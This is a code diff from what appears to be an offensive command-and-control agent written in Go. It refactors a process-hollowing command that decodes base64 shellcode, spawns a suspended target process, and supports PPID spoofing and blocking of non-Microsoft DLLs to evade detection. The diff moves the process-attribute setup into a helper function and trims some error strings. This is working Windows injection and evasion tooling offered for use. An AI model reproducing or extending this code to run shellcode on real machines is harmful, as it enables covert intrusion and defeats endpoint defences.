@@ -12,6 +12,8 @@ import (
 	"unsafe"
 
 	"fawkes/pkg/structs"
+
+	"golang.org/x/sys/windows"
 )
 
 type HollowingCommand struct{}
@@ -43,16 +45,16 @@ func (c *HollowingCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	if params.ShellcodeB64 == "" {
-		return errorResult("Error: shellcode_b64 is required")
+		return errorResult("shellcode_b64 is required")
 	}
 
 	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
 	if err != nil {
-		return errorf("Error decoding shellcode: %v", err)
+		return errorf("decoding shellcode: %v", err)
 	}
 
 	if len(shellcode) == 0 {
-		return errorResult("Error: shellcode is empty")
+		return errorResult("shellcode is empty")
 	}
 
 	if params.Target == "" {
@@ -95,60 +97,19 @@ func performHollowing(shellcode []byte, params hollowParams) (string, error) {
 
 	createFlags := uint32(CREATE_SUSPENDED | CREATE_NEW_CONSOLE)
 
-	// PPID spoofing / DLL blocking via extended attributes
 	if params.Ppid > 0 || params.BlockDLLs {
 		createFlags |= EXTENDED_STARTUPINFO_PRESENT
 
-		attrCount := uint32(0)
-		if params.Ppid > 0 {
-			attrCount++
+		attrList, parentHandle, cleanup, attrErr := initProcAttrList(params.Ppid, params.BlockDLLs)
+		if attrErr != nil {
+			return sb.String(), attrErr
 		}
-		if params.BlockDLLs {
-			attrCount++
-		}
-
-		var size uintptr
-		procInitializeProcThreadAttributeList.Call(0, uintptr(attrCount), 0, uintptr(unsafe.Pointer(&size)))
-		listBuf := make([]byte, size)
-		attrList := (*PROC_THREAD_ATTRIBUTE_LIST)(unsafe.Pointer(&listBuf[0]))
-		ret, _, _ := procInitializeProcThreadAttributeList.Call(
-			uintptr(unsafe.Pointer(attrList)), uintptr(attrCount), 0, uintptr(unsafe.Pointer(&size)),
-		)
-		if ret == 0 {
-			return sb.String(), fmt.Errorf("InitializeProcThreadAttributeList failed")
-		}
-
-		if params.Ppid > 0 {
-			parentHandle, _, openErr := procOpenProcess.Call(
-				uintptr(PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION),
-				0, uintptr(params.Ppid),
-			)
-			if parentHandle == 0 {
-				return sb.String(), fmt.Errorf("open parent PID %d: %w", params.Ppid, openErr)
-			}
-			defer procCloseHandle.Call(parentHandle)
-
-			ret, _, _ = procUpdateProcThreadAttribute.Call(
-				uintptr(unsafe.Pointer(attrList)), 0,
-				uintptr(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
-				uintptr(unsafe.Pointer(&parentHandle)), unsafe.Sizeof(parentHandle), 0, 0,
-			)
-			if ret == 0 {
-				return sb.String(), fmt.Errorf("UpdateProcThreadAttribute (PPID) failed")
-			}
+		defer cleanup()
+		if parentHandle != 0 {
+			defer windows.CloseHandle(parentHandle)
 			sb.WriteString(fmt.Sprintf("[*] PPID spoofing: %d\n", params.Ppid))
 		}
-
 		if params.BlockDLLs {
-			policy := uint64(PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON)
-			ret, _, _ = procUpdateProcThreadAttribute.Call(
-				uintptr(unsafe.Pointer(attrList)), 0,
-				uintptr(PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY),
-				uintptr(unsafe.Pointer(&policy)), unsafe.Sizeof(policy), 0, 0,
-			)
-			if ret == 0 {
-				return sb.String(), fmt.Errorf("UpdateProcThreadAttribute (BlockDLLs) failed")
-			}
 			sb.WriteString("[*] Non-Microsoft DLL blocking enabled\n")
 		}
 
@@ -167,7 +128,7 @@ func performHollowing(shellcode []byte, params hollowParams) (string, error) {
 			uintptr(unsafe.Pointer(&pi)),
 		)
 		if ret == 0 {
-			return sb.String(), fmt.Errorf("CreateProcessW failed: %w", lastErr)
+			return sb.String(), fmt.Errorf("process creation failed: %w", lastErr)
 		}
 	} else {
 		err = syscall.CreateProcess(
